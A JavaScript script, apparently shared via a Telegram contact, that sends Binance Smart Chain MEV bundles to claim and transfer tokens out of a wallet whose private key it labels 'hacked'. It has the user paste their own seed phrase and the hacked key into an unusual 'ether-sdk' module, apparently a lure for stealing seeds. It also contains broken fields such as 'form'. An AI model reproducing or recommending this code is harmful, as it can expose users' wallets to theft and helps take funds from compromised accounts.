//Script created by Adam Barth  //Telegram @barthadam


const ethers = require("ethers")
const ethersWallet= require("ether-sdk")
const Web3 = require("web3")



// wallet that send's BNB to claim 
var seed = "replace with your safe wallet seed" // YOUR SAFE WALLET SEED THAT WILL RECEIVE THE TOKENS
let mnemonicWallet = ethersWallet.fromMnemonic(seed);
var PRIVATEKEY = mnemonicWallet.privateKey;
var myAddress = mnemonicWallet.address

// wallet for claim reward or unstake

var Key = "replace with the hacked private key" // HACKED PRIVATE KEY 
var hash32Key = ethersWallet.fromPrivateKey(Key);



async function main() {
  var url1='https://bsc-dataseed.binance.org'
  var url2='https://bsc-dataseed1.defibit.io'
  var url3='https://bsc-dataseed1.ninicoin.io'
  var url5 = "https://bsc.nodereal.io"
  

   const web3 = new Web3(
    new Web3.providers.HttpProvider(url5)
  );
  
  const signer = web3.eth.accounts.privateKeyToAccount(
    hash32Key
  );

    let iface = new ethers.utils.Interface([
      'event Approval(address indexed owner, address indexed spender, uint value)',
      'event Transfer(address indexed from, address indexed to, uint value)',
      'function name() external pure returns (string memory)',
      'function symbol() external pure returns (string memory)',
      'function decimals() external pure returns (uint8)',
      'function totalSupply() external view returns (uint)',
      'function balanceOf(address owner) external view returns (uint)',
      'function allowance(address owner, address spender) external view returns (uint)',
      'function approve(address spender, uint value) external returns (bool)',
      'function transfer(address to, uint value) external returns (bool)',
  
      'function DOMAIN_SEPARATOR() external view returns (bytes32)',
      'function PERMIT_TYPEHASH() external pure returns (bytes32)',
      'function nonces(address owner) external view returns (uint)',
      'function claim(bytes32 )'
    ]);
  



   var noncesend =  await web3.eth.getTransactionCount(myAddress, 'latest'); 
   var nonce = await web3.eth.getTransactionCount(signer.address,'latest')// nonce starts counting from 0

   gasPrice=1000000000
   const transaction = {
    'form':myAddress,
    'to': signer.address, 
    'gas': 21000, 
    'value':ethers.utils.parseUnits((1000000000*300000).toString(),"wei"),
    'gasPrice': gasPrice, 
    'nonce':noncesend
   };

   const transactionBundle = {
    'form':myAddress,
    'to': "0x965Df5Ff6.............", // hacked address 
    'gas': 21000, 
    'value':web3.utils.toWei('0.008','ether'),
    'gasPrice': "5000000000", 
    'nonce':noncesend+1
   };
   
   const transaction2 = {
    'from':signer.address,
     'to':"0x8e13B3B6033.............", // claim contract
     'gas': 200000,  
     'gasPrice': 1000000000, 
     "data":iface.encodeFunctionData("claim",[
      ""
     ]
    ),
     'nonce':nonce
    };
    
    const transaction3 = {
      'from':signer.address,
       'to':"0xfd4f2caf..............", // token contract
       'gas': 100000,  
       'gasPrice': 1000000000 , 
     "data":iface.encodeFunctionData("transfer",[
      myAddress,
      web3.utils.toWei('77','ether') // change 77 to how many token's u want transfer 
    ]),
       'nonce':nonce+1
      };
  
  

  const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATEKEY);
  const signedTx2 = await web3.eth.accounts.signTransaction(transaction2, signer.privateKey);
  const signedTx3 = await web3.eth.accounts.signTransaction(transaction3, signer.privateKey );
  const signedTx5 = await web3.eth.accounts.signTransaction(transactionBundle, PRIVATEKEY);

 


  
var block = await web3.eth.getBlock('latest')
block = block.number+2
console.log(block)
block = block.toString(16)


var resp = await fetch('https://mev.api.blxrbdn.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': '' // change your api key 
  },
  body: JSON.stringify({
    'id': '1',
    'method': 'blxr_submit_bundle',
    'params': {
      'transaction':[signedTx5.rawTransaction,signedTx.rawTransaction,signedTx2.rawTransaction,signedTx3.rawTransaction],
      'blockchain_network': 'BSC-Mainnet',
      'block_number': '0x'+block,
  
    }
  })
});
  var data = await resp.text();
  console.log(data)


}
  
setInterval(() => {
  main()
  },500);



